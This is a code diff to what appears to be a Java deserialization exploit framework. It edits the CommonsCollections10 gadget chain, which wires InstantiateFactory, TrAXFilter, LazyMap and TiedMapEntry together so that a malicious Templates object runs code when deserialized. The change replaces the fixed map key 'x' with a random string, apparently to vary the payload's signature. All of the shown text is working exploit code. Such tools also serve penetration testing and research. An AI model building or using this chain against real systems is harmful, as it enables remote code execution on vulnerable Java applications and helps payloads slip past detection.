@@ -6,6 +6,7 @@ import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.Sink;
+import com.ppp.utils.RanDomUtils;
 import com.ppp.utils.Reflections;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -38,16 +39,18 @@ public class CommonsCollections10 implements ObjectPayload<Object> {
     }
 
     public Object getChain(Object templates) throws Exception {
+        String s = RanDomUtils.generateRandomString(1);
+
         InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
         FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);
         ConstantTransformer constantTransformer = new ConstantTransformer(1);
 
         HashMap innerMap = new HashMap();
         LazyMap outerMap = (LazyMap) LazyMap.decorate(innerMap, constantTransformer);
-        TiedMapEntry entry = new TiedMapEntry(outerMap, "x");
+        TiedMapEntry entry = new TiedMapEntry(outerMap, s);
 
         HashMap hashMap = new HashMap();
-        hashMap.put(entry, "x");
+        hashMap.put(entry, s);
         Reflections.setFieldValue(outerMap, "factory", factoryTransformer);
         outerMap.clear();
 
